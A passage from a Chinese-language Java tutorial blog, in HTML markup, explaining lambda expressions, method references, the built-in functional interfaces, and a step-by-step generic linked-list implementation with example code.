class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lambda表达式</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span> <span class="comment">//函数式接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMath</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test60</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMath</span> <span class="variable">math</span> <span class="operator">=</span> (t1,t2) -&gt; t1+t2;</span><br><span class="line">        System.out.println(math.add(<span class="number">10</span>,<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    使用lambda表达式可以解决传统面向对象之中关于结构的限制，使得代码更加的简便。</p><h5 id="方法引用"><a href="#方法引用" class="headerlink" title="方法引用"></a>方法引用</h5><p>​    引用数据类型最大的特点就是可以进行内存的指向处理，但是在传统的开发之中使用的一直只是对象引用操作。而在JDK1.8之后我们也提供方法的引用，即：不同的方法名称可以描述同一个方法。如果要进行方法的引用在Java里面提供有如下四种形式：</p><p>​    <strong>1、引用静态方法——-类名称 :: static方法名称</strong></p><p>​    <strong>2、引用某个实例对象的方法——实例化对象 :: 普通方法</strong></p><p>​    <strong>3、引用特定类型的方法——特定类 :: 普通方法</strong></p><p>​    <strong>4、引用构造方法——类名称 :: new</strong></p><p>范例：引用静态方法</p><p>​    在String类里面提供有String.valueOf()方法，这个方法就属于静态方法</p><ul><li>方法定义：public static String valueOf(int i);该方法有参数还有返回值。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//lambda表达式方法引用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//p参数，r是rutern</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IFunction</span>&lt;P,R&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">change</span><span class="params">(P p)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test61</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IFunction&lt;Integer,String&gt; fun = String :: valueOf;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> fun.change(<span class="number">100</span>);</span><br><span class="line">        System.out.println(str.length());<span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    利用方法引用这一概念可以为一个方法定义多个名字，但是要求必须是函数式接口。</p><p>范例：引用实例化对象中的方法</p><p>​    在String类里面有一个转大写的方法：public String toUpperCase();</p><ul><li>这个方法是必须在有实例化对象提供的情况下才可以调用。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//lambda表达式方法引用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//p参数，r是rutern</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IFunction</span>&lt;R&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">upper</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test61</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IFunction&lt;String&gt; fun = <span class="string">&quot;mes9s0&quot;</span> :: toUpperCase;</span><br><span class="line">        System.out.println(fun.upper());<span class="comment">//MES9S0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在进行方法引用的时候也可以引用特定类中的一些操作方法。</p><p>​    在String类里面提供有一个字符串大小关系的比较:public int compareTo(String anotherString);</p><ul><li>这是一个普通方法，如果要引用普通方法，则往往都需要实例化对象，但是如果说现在不想给出实例化对象，只是想引用这个方法，则可以使用特定类类进行引用处理。</li></ul><p>范例：引用指定类中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//lambda表达式方法引用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//p参数，r是rutern</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IFunction</span>&lt;P&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(P p1, P p2)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test61</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IFunction&lt;String&gt; fun = String::compareTo;</span><br><span class="line">        System.out.println(fun.compare(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;a&quot;</span>));<span class="comment">//-32</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在方法引用里面最具有杀伤力的就是构造方法的引用。</p><p>范例：引用构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//lambda表达式方法引用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person12</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person12</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;姓名：&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、年龄：&quot;</span> + <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IFunction</span>&lt;R&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">create</span><span class="params">(String s, <span class="type">int</span> a)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test61</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IFunction&lt;Person12&gt; fun = Person12::<span class="keyword">new</span>;</span><br><span class="line">        System.out.println(fun.create(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    提供方法引用的概念更多的情况下也只是弥补了对于引用的支持功能。</p><h5 id="内建函数式接口"><a href="#内建函数式接口" class="headerlink" title="内建函数式接口"></a>内建函数式接口</h5><p>​    在JDK1.8之中提供有lambda表达式也提供有方法引用，但是你会发现现在如果由开发者自己定义函数式接口，往往都需要使用“@FunctionalIntetrface”注解来进行大量声明，于是很多的情况下如果为了方便则可以直接引用系统中提供的函数式接口。</p><p>​    在系统中专门提供了java.util.function的开发包，里面可以直接使用函数式接口，在这个包下面一共有如下的几个核心接口供使用。</p><p>1、功能性函数式接口：</p><p>​    对于接受和返回一个值的可以使用。</p><p>​    例如在String类中有一个方法判断是否以制定的字符串开头:public boolean startsWith(String str)</p><table><thead><tr><th>接口定义：</th><th>接口使用：</th></tr></thead><tbody><tr><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073643.jpg"                      alt="image-20220728013341053"                ></td><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073646.jpg"                      alt="image-20220728014022989"                ></td></tr></tbody></table><p>2、消费型函数式接口：</p><p>​    对于只能够进行数据的处理操作，而没有任何的返回。</p><p>​    例如在进行系统数据输出的时候使用的是：System.out.println();</p><table><thead><tr><th>接口定义：</th><th>接口使用：</th></tr></thead><tbody><tr><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073647.jpg"                      alt="image-20220728014512082"                ></td><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073648.jpg"                      alt="image-20220728014723553"                ></td></tr></tbody></table><p>3、供给型函数式接口：</p><p>​    对于只能够进行数据返回，而没有接受参数。</p><p>​    在String类中提供有转小写方法 public String toLowerCase()，这个方法没有接受参数，但是有返回值;</p><table><thead><tr><th>接口定义：</th><th>接口使用：</th></tr></thead><tbody><tr><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073649.jpg"                      alt="image-20220728015248803"                ></td><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073651.jpg"                      alt="image-20220728015427117"                ></td></tr></tbody></table><p>4、断言型函数式接口</p><p>​    进行判断处理。</p><p>​    在String类有一个equalsIgnoreCase()方法</p><table><thead><tr><th>接口定义：</th><th>接口使用：</th></tr></thead><tbody><tr><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073652.jpg"                      alt="image-20220728015543783"                ></td><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073653.jpg"                      alt="image-20220728015809387"                ></td></tr></tbody></table><p>​    以后对于实际的项目，如果JDK本身提供的函数式接口可以被我们所使用，那么就没有必要进行重新定义了。</p><hr><h4 id="链表的定义与使用"><a href="#链表的定义与使用" class="headerlink" title="链表的定义与使用"></a>链表的定义与使用</h4><p>​    链表的本质是一个动态的对象数组，它可以实现若干个对象的存储。</p><h5 id="链表实现简介"><a href="#链表实现简介" class="headerlink" title="链表实现简介"></a>链表实现简介</h5><p>​    在实际的开发之中对象数组是一项非常实用的技术，并且利用其可以描述出“多”方的概念，例如：一个人有多本书，则在人的类里面一定要提供有一个对象数组保存书的信息，但是传统的对象数组依赖于数组的概念，所以数组里面最大的缺点在于长度是固定的，正是因为如此所以在实际的开发之中，传统的数组应用是非常有限的（数组的接收以及循环处理）。但是如果要想进行灵活的数据保存，俺么久必须自己来实现结构。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073654.jpg"                      alt="image-20220728021221712"                ></p><p>​    传统的对象数组的开发操作依赖于索引的控制，如果想要实现内容的动态维护，那么难度太高了，而且复杂度攀升。所以现在就可以发现，对于一成不动的数据可以使用对象数组来实现，但是对于可能随时变化的数据就必须实现一个可以动态扩充的对象数组。</p><p>​    所谓的链表实质性的本质是利用引用的逻辑关系来实现类似于数组的数据处理操作，以一种保存“多”方数据的形式，实现数组类似的功能。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073656.jpg"                      alt="image-20220728022103106"                ></p><p>​    通过分析可以发现，如果想要实现链表处理，那么需要有一个公共的结构，这个结构可以实现数据的保存以及下一个连接的指向。为了描述这样的逻辑，可以把每一个存储理解为一个节点，所以此时应该出一个节点类，这个节点类里面可以保存各种数据类型的数据。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073657.jpg"                      alt="image-20220728022543419"                ></p><p>​    虽然已经清楚了通过Node节点来进行数据的保存，但是毕竟这里面需要牵扯到节点的引用处理关系。那么这个引用处理关系肯定不可能由使用者来配置，所以还需要一个类来进行Node类的配置。</p><p>范例：直接操作Node</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表实现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> E data;</span><br><span class="line">    <span class="keyword">private</span> Node next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Node&lt;E&gt; next)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">getNext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test63</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Node&lt;String&gt; n1 = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(<span class="string">&quot;火车头&quot;</span>);</span><br><span class="line">        Node&lt;String&gt; n2 = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(<span class="string">&quot;车厢1&quot;</span>);</span><br><span class="line">        Node&lt;String&gt; n3 = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(<span class="string">&quot;车厢2&quot;</span>);</span><br><span class="line">        Node&lt;String&gt; n4 = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(<span class="string">&quot;车厢3&quot;</span>);</span><br><span class="line">        Node&lt;String&gt; n5 = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(<span class="string">&quot;车厢4&quot;</span>);</span><br><span class="line">        n1.setNext(n2);</span><br><span class="line">        n2.setNext(n3);</span><br><span class="line">        n3.setNext(n4);</span><br><span class="line">        n4.setNext(n5);</span><br><span class="line">        print1(n1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print1</span><span class="params">(Node&lt;?&gt; node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(node.getData());</span><br><span class="line">            print1(node.getNext());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这样肯定不可能的，所以应该有一个专门的类来进行节点的引用关系的配置。因为真实的使用者实际上关心的只是数据的存储与获取，所以现在应该对Node类进行包装处理。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073658.jpg"                      alt="image-20220728024213650"                ></p><h5 id="数据增加"><a href="#数据增加" class="headerlink" title="数据增加"></a>数据增加</h5><p>​    数据保存：public void add(E e)</p><p>​    通过之前的分析可以发现在进行链表操作的过程之中为了避免转型的异常应该使用的是泛型，同时也应该设计一个链表的标准接口，同时具体实现该接口的时候还应该通过Node类做出节点的关系描述。</p><p>范例：定义Node类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的结构----------</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    现在定义的Node类之中并没有出现setter与getter方法，是因为内部类中的私有属性也方便外部类服务。</p><p>范例：实现数据增加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span>&#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>)&#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    Link类只是负责数据的操作与根节点的处理，而后续节点内部的处理全部是由Node类负责完成的。</p><h5 id="获取集合个数"><a href="#获取集合个数" class="headerlink" title="获取集合个数"></a>获取集合个数</h5><p>​    获取数据长度：public int size()</p><p>​    在链表之中往往需要保存大量的数据，这些数据往往需要进行数据个数的统计操作，所以应该在LinkImpl子类里面追加有数据统计信息，同时当增加或删除数据时都应该对个数进行修改。</p><p>​    1、在ILink接口里面追加有一个获取数据个数的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、在LinkImpl子类里面追加一个个数统计的属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br></pre></td></tr></table></figure><p>​    3、在add()方法里进行数据个数的追加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>)&#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">        <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span 